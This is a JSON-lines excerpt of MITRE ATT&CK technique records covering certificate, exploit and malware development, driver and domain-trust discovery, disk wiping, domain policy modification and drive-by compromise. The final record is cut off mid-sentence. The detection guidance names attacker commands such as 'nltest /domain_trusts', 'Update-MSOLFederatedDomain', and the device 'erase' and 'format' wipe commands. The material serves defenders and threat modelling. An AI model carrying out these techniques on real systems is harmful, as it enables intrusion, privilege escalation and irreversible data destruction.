{"ID":"T1587.003","name":"Develop Capabilities: Digital Certificates","description":"Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).\n\nAdversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).\n\nAfter creating a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.","url":"https://attack.mitre.org/techniques/T1587/003","created":"01 October 2020","last modified":"16 October 2021","version":"1.2","tactics":"Resource Development","detection":"Consider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017)\n\nDetection efforts may be focused on related behaviors, such as [Web Protocols](https://attack.mitre.org/techniques/T1071/001), [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002), and/or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004).","platforms":"PRE","data sources":"Internet Scan: Response Content","is sub-technique":true,"sub-technique of":"T1587","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: PWC WellMess C2 August 2020),(Citation: PWC WellMess July 2020),(Citation: Talos Promethium June 2020),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),"}
{"ID":"T1587.004","name":"Develop Capabilities: Exploits","description":"Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.(Citation: NYTStuxnet) Adversaries may use information acquired via [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006) to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.(Citation: Irongeek Sims BSides 2017)\n\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).","url":"https://attack.mitre.org/techniques/T1587/004","created":"01 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Resource Development","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on behaviors relating to the use of exploits (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1587","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1587.001","name":"Develop Capabilities: Malware","description":"Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)\n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\n\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation: FireEye APT29)","url":"https://attack.mitre.org/techniques/T1587/001","created":"01 October 2020","last modified":"14 January 2022","version":"1.2","tactics":"Resource Development","detection":"Consider analyzing malware for features that may be associated with the adversary and/or their developers, such as compiler used, debugging artifacts, or code similarities. Malware repositories can also be used to identify additional samples associated with the adversary and identify development patterns over time.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.","platforms":"PRE","data sources":"Malware Repository: Malware Content, Malware Repository: Malware Metadata","is sub-technique":true,"sub-technique of":"T1587","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Lazarus Jun 2020),(Citation: FBI Flash FIN7 USB),(Citation: McAfee Sharpshooter December 2018),(Citation: Google TAG Lazarus Jan 2021),(Citation: Microsoft NICKEL December 2021),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FoxIT Wocao December 2019),(Citation: CISA AppleJeus Feb 2021),(Citation: McAfee Lazarus Nov 2020),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Mandiant No Easy Breach),(Citation: FireEye FIN7 Oct 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: Recorded Future Turla Infra 2020),(Citation: BlackBerry CostaRicto November 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: McAfee Lazarus Jul 2020),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Bitdefender LuminousMoth July 2021),(Citation: Unit 42 Hildegard Malware),(Citation: F-Secure The Dukes),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: KISA Operation Muzabi),(Citation: Cylance Cleaver),(Citation: ESET Dukes October 2019),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: CrowdStrike SUNSPOT Implant January 2021),"}
{"ID":"T1652","name":"Device Driver Discovery","description":"Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) or other defenses (e.g., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)), as well as potential exploitable vulnerabilities (e.g., [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)).\n\nMany OS utilities may provide information about local device drivers, such as `driverquery.exe` and the `EnumDeviceDrivers()` API function on Windows.(Citation: Microsoft Driverquery)(Citation: Microsoft EnumDeviceDrivers) Information about device drivers (as well as associated services, i.e., [System Service Discovery](https://attack.mitre.org/techniques/T1007)) may also be available in the Registry.(Citation: Microsoft Registry Drivers)\n\nOn Linux/macOS, device drivers (in the form of kernel modules) may be visible within `/dev` or using utilities such as `lsmod` and `modinfo`.(Citation: Linux Kernel Programming)(Citation: lsmod man)(Citation: modinfo man)","url":"https://attack.mitre.org/techniques/T1652","created":"28 March 2023","last modified":"04 May 2023","version":"1.0","tactics":"Discovery","detection":null,"platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Access","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"ESET","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Kaspersky ProjectSauron Technical Analysis),"}
{"ID":"T1006","name":"Direct Volume Access","description":"Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: Github PowerSploit Ninjacopy)","url":"https://attack.mitre.org/techniques/T1006","created":"31 May 2017","last modified":"09 February 2021","version":"2.0","tactics":"Defense Evasion","detection":"Monitor handle opens on drive volumes that are made by processes to determine when they may directly access logical drives. (Citation: Github PowerSploit Ninjacopy)\n\nMonitor processes and command-line arguments for actions that could be taken to copy files from the logical drive and evade common file system protections. Since this technique may also be used through [PowerShell](https://attack.mitre.org/techniques/T1059/001), additional logging of PowerShell scripts is recommended.","platforms":"Windows","data sources":"Command: Command Execution, Drive: Drive Access","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"File monitoring, File system access controls","contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1561","name":"Disk Wipe","description":"Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)\n\nOn network devices, adversaries may wipe configuration files and other data from the device using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `erase`.(Citation: erase_cmd_cisco)","url":"https://attack.mitre.org/techniques/T1561","created":"20 February 2020","last modified":"20 April 2023","version":"1.1","tactics":"Impact","detection":"Look for attempts to read/write to sensitive locations like the partition boot sector, master boot record, disk partition table, or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the <code>\\\\\\\\.\\\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.","platforms":"Linux, Network, Windows, macOS","data sources":"Command: Command Execution, Drive: Drive Access, Drive: Drive Modification, Driver: Driver Load, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Austin Clark, @c2defense","permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":",(Citation: Ready.gov IT DRP)"}
{"ID":"T1561.001","name":"Disk Wipe: Disk Content Wipe","description":"Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.\n\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have also been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk are erased instead of individual files.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)","url":"https://attack.mitre.org/techniques/T1561/001","created":"20 February 2020","last modified":"12 April 2023","version":"1.0","tactics":"Impact","detection":"Look for attempts to read/write to sensitive locations like the partition boot sector or BIOS parameter block/superblock. Monitor for direct access read/write attempts using the <code>\\\\\\\\.\\\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.\n\nFor network infrastructure devices, collect AAA logging to monitor for `erase` commands that delete critical configuration files.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Drive: Drive Access, Drive: Drive Modification, Driver: Driver Load, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1561","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":"(Citation: Medium S2W WhisperGate January 2022),(Citation: Sophos BlackCat Jul 2022),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: Symantec Elfin Mar 2019),(Citation: Novetta Blockbuster Destructive Malware),(Citation: Crowdstrike WhisperGate January 2022),(Citation: Cisco Ukraine Wipers January 2022),(Citation: IBM MegaCortex),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Microsoft BlackCat Jun 2022),(Citation: Ready.gov IT DRP)"}
{"ID":"T1561.002","name":"Disk Wipe: Disk Structure Wipe","description":"Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)","url":"https://attack.mitre.org/techniques/T1561/002","created":"20 February 2020","last modified":"14 April 2023","version":"1.1","tactics":"Impact","detection":"Look for attempts to read/write to sensitive locations like the master boot record and the disk partition table. Monitor for direct access read/write attempts using the <code>\\\\\\\\.\\\\</code> notation.(Citation: Microsoft Sysmon v6 May 2017) Monitor for unusual kernel driver installation activity.\n\nFor network infrastructure devices, collect AAA logging to monitor for `format` commands being run to erase the file structure and prevent recovery of the device.","platforms":"Linux, Network, Windows, macOS","data sources":"Command: Command Execution, Drive: Drive Access, Drive: Drive Modification, Driver: Driver Load, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1561","defenses bypassed":null,"contributors":"Austin Clark, @c2defense","permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":"(Citation: ESET Telebots June 2017),(Citation: Palo Alto Shamoon Nov 2016),(Citation: FireEye Shamoon Nov 2016),(Citation: US-CERT SHARPKNOT June 2018),(Citation: Unit 42 Shamoon3 2018),(Citation: Unit 42 WhisperGate January 2022),(Citation: Novetta Blockbuster),(Citation: Microsoft WhisperGate January 2022),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: Symantec Elfin Mar 2019),(Citation: Talos Group123),(Citation: Crowdstrike WhisperGate January 2022),(Citation: Cisco Ukraine Wipers January 2022),(Citation: FireEye APT37 Feb 2018),(Citation: Cisco CaddyWiper March 2022),(Citation: Symantec Shamoon 2012),(Citation: Medium S2W WhisperGate January 2022),(Citation: FireEye APT38 Oct 2018),(Citation: US-CERT Ukraine Feb 2016),(Citation: ESET CaddyWiper March 2022),(Citation: Symantec Ukraine Wipers February 2022),(Citation: Qualys Hermetic Wiper March 2022),(Citation: Trend Micro KillDisk 1),(Citation: Cybereason WhisperGate February 2022),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Ready.gov IT DRP)"}
{"ID":"T1484","name":"Domain Policy Modification","description":"Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Domains provide a centralized means of managing how computer resources (ex: computers, user accounts) can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts.\n\nWith sufficient permissions, adversaries can modify domain policy settings. Since domain configuration settings control many of the interactions within the Active Directory (AD) environment, there are a great number of potential attacks that can stem from this abuse. Examples of such abuse include modifying GPOs to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) to computers throughout the domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) or modifying domain trusts to include an adversary controlled domain where they can control access tokens that will subsequently be accepted by victim domain resources.(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks) Adversaries can also change configuration settings within the AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207).\n\nAdversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.","url":"https://attack.mitre.org/techniques/T1484","created":"07 March 2019","last modified":"09 February 2021","version":"2.0","tactics":"Defense Evasion, Privilege Escalation","detection":"It may be possible to detect domain policy modifications using Windows event logs. Group policy modifications, for example, may be logged under a variety of Windows event IDs for modifying, creating, undeleting, moving, and deleting directory service objects (Event ID 5136, 5137, 5138, 5139, 5141 respectively). Monitor for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypes <code>Set federation settings on domain</code> and <code>Set domain authentication</code>.(Citation: Microsoft - Azure Sentinel ADFSDomainTrustMods)(Citation: Microsoft 365 Defender Solorigate) This may also include monitoring for Event ID 307 which can be correlated to relevant Event ID 510 with the same Instance ID for change details.(Citation: Sygnia Golden SAML)(Citation: CISA SolarWinds Cloud Detection)\n\nConsider monitoring for commands/cmdlets and command-line arguments that may be leveraged to modify domain policy settings.(Citation: Microsoft - Update or Repair Federated domain) Some domain policy modifications, such as changes to federation settings, are likely to be rare.(Citation: Microsoft 365 Defender Solorigate)","platforms":"Azure AD, Windows","data sources":"Active Directory: Active Directory Object Creation, Active Directory: Active Directory Object Deletion, Active Directory: Active Directory Object Modification, Command: Command Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"File system access controls, System access controls","contributors":null,"permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Microsoft WMI Filters),(Citation: Wald0 Guide to GPOs),(Citation: GitHub Bloodhound),(Citation: Microsoft GPO Security Filtering)"}
{"ID":"T1484.002","name":"Domain Policy Modification: Domain Trust Modification","description":"Adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and/or elevate privileges. Domain trust details, such as whether or not a domain is federated, allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.\n\nManipulating the domain trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002), without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert a domain to a federated domain, which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.(Citation: AADInternals zure AD Federated Domain) ","url":"https://attack.mitre.org/techniques/T1484/002","created":"28 December 2020","last modified":"21 October 2022","version":"1.1","tactics":"Defense Evasion, Privilege Escalation","detection":"Monitor for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypes <code>Set federation settings on domain</code> and <code>Set domain authentication</code>.(Citation: Microsoft - Azure Sentinel ADFSDomainTrustMods) This may also include monitoring for Event ID 307 which can be correlated to relevant Event ID 510 with the same Instance ID for change details.(Citation: Sygnia Golden SAML)(Citation: CISA SolarWinds Cloud Detection)\n\nMonitor for PowerShell commands such as: <code>Update-MSOLFederatedDomain –DomainName: \"Federated Domain Name\"</code>, or <code>Update-MSOLFederatedDomain –DomainName: \"Federated Domain Name\" –supportmultipledomain</code>.(Citation: Microsoft - Update or Repair Federated domain)","platforms":"Azure AD, Windows","data sources":"Active Directory: Active Directory Object Creation, Active Directory: Active Directory Object Modification, Command: Command Execution","is sub-technique":true,"sub-technique of":"T1484","defenses bypassed":null,"contributors":"Blake Strom, Microsoft 365 Defender; Praetorian","permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Secureworks IRON RITUAL Profile),(Citation: Azure AD Federation Vulnerability),(Citation: Microsoft 365 Defender Solorigate),(Citation: AADInternals Documentation),"}
{"ID":"T1484.001","name":"Domain Policy Modification: Group Policy Modification","description":"Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)","url":"https://attack.mitre.org/techniques/T1484/001","created":"28 December 2020","last modified":"06 January 2023","version":"1.0","tactics":"Defense Evasion, Privilege Escalation","detection":"It is possible to detect GPO modifications by monitoring directory service changes using Windows event logs. Several events may be logged for such GPO modifications, including:\n\n* Event ID 5136 - A directory service object was modified\n* Event ID 5137 - A directory service object was created\n* Event ID 5138 - A directory service object was undeleted\n* Event ID 5139 - A directory service object was moved\n* Event ID 5141 - A directory service object was deleted\n\n\nGPO abuse will often be accompanied by some other behavior such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), which will have events associated with it to detect. Subsequent permission value modifications, like those to SeEnableDelegationPrivilege, can also be searched for in events associated with privileges assigned to new logons (Event ID 4672) and assignment of user rights (Event ID 4704).","platforms":"Windows","data sources":"Active Directory: Active Directory Object Creation, Active Directory: Active Directory Object Deletion, Active Directory: Active Directory Object Modification, Command: Command Execution","is sub-technique":true,"sub-technique of":"T1484","defenses bypassed":null,"contributors":"Itamar Mizrahi, Cymptom; Tristan Bennett, Seamless Intelligence","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Check Point Meteor Aug 2021),(Citation: Cybereason Egregor Nov 2020),(Citation: Microsoft Prestige ransomware October 2022),(Citation: Github PowerShell Empire),(Citation: Intrinsec Egregor Nov 2020),(Citation: ESET Hermetic Wizard March 2022),(Citation: Crowdstrike Indrik November 2018),(Citation: Microsoft WMI Filters),(Citation: Wald0 Guide to GPOs),(Citation: GitHub Bloodhound),(Citation: Microsoft GPO Security Filtering)"}
{"ID":"T1482","name":"Domain Trust Discovery","description":"Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)","url":"https://attack.mitre.org/techniques/T1482","created":"14 February 2019","last modified":"16 June 2022","version":"1.2","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information, such as `nltest /domain_trusts`. Remote access tools with built-in features may interact directly with the Windows API to gather information. Look for the `DSEnumerateDomainTrusts()` Win32 API call to spot activity associated with [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Harmj0y Domain Trusts) Information may also be acquired through Windows system management tools such as [PowerShell](https://attack.mitre.org/techniques/T1059/001). The .NET method `GetAllTrustRelationships()` can be an indicator of [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Microsoft GetAllTrustRelationships)\n","platforms":"Windows","data sources":"Command: Command Execution, Network Traffic: Network Traffic Content, Process: OS API Execution, Process: Process Creation, Script: Script Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Dave Westgard; Elia Florio, Microsoft; ExtraHop; Mnemonic; RedHuntLabs, @redhuntlabs","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCC Group Team9 June 2020),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: NCC Group Chimera January 2021),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Kaspersky QakBot September 2021),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Cybereason Bazar July 2020),(Citation: Nltest Manual),(Citation: Cyberreason Anchor December 2019),(Citation: Fortinet TrickBot),(Citation: PowerSploit Documentation),(Citation: FireEye FIN6 Apr 2019),(Citation: GitHub PoshC2),(Citation: Github PowerShell Empire),(Citation: GitHub PowerSploit May 2012),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Symantec Bumblebee June 2022),(Citation: DFIR Ryuk's Return October 2020),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: DFIR Phosphorus November 2021),(Citation: CrowdStrike BloodHound April 2018),(Citation: Harmj0y Domain Trusts),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Volexity SolarWinds),(Citation: Bitdefender FIN8 July 2021),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Trend Micro Black Basta October 2022),(Citation: Harmj0y Domain Trusts)"}
{"ID":"T1189","name":"Drive-by Compromise","description":"Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring [Application Access Token](https://attack.mitre.org/techniques/T1550/001).\n\nMultiple ways of delivering exploit code to a browser exist (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)), including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting\n* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary\n* Malicious ads are paid for and served through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used 